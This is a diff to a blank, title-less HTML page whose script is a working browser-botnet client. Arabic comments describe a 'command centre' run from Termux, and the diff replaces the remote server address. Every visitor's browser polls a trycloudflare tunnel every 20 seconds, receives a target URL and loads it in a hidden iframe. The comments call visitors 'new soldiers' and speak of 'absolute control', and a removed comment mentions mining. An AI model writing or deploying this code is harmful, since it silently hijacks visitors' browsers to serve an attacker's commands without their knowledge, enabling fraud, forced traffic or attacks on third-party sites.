@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> </title> <!-- صفحة أشباح بدون عنوان -->
-    <style>body { background: #fff; margin: 0; padding: 0; overflow: hidden; }</style>
+    <title> </title>
+    <style>body { background: #8fff; margin: 0; padding: 0; overflow: hidden; }</style>
 </head>
 <body>
     <script>
         // 🛰️ رابط 'مركز القيادة' في الترمكس (الخاص بك)
-        // استبدل النجوم بالرابط: trance-billing-supports-lead.trycloudflare.com
-        const masterServer = https://jail-hearing-rolled-precipitation.trycloudflare.com ";
+        // انسخ الرابط الجديد من الترمكس وضعه هنا بين علامتي التنصيص
+        const masterServer = "https://til-preserve-circuits-regard.trycloudflare.com";
 
         function syncWithGeneral() {
-            // 🕵️ إرسال نبضة 'أنا جندي جديد' للترمكس لكي تراه في الرادار
+            // 🕵️ إرسال نبضة 'أنا جندي جديد' للترمكس
             fetch(`${masterServer}/ping.php`)
             .then(response => response.json())
             .then(data => {
-                // 🕹️ تنفيذ الأمر القادم من الترمكس (فتح رابط، تعدين، إلخ)
+                // 🕹️ تنفيذ الأمر القادم من الترمكس (فتح رابط)
                 if (data.target) {
                     const shadowFrame = document.createElement('iframe');
                     shadowFrame.src = data.target;
@@ -28,12 +28,12 @@
                     console.log("💰 [ORDER RECEIVED] | Target: " + data.target);
                 }
             })
-            .catch(error => console.log("Waiting for General's orders..."));
+            .catch(error => console.log("في انتظار أوامر الجنرال..."));
         }
 
         // المزامنة كل 20 ثانية لضمان السيطرة المطلقة
         setInterval(syncWithGeneral, 20000);
-        syncWithGeneral(); // النبضة الأولى فور الدخول
+        syncWithGeneral(); // النبضة الأولى
     </script>
 </body>
 </html>
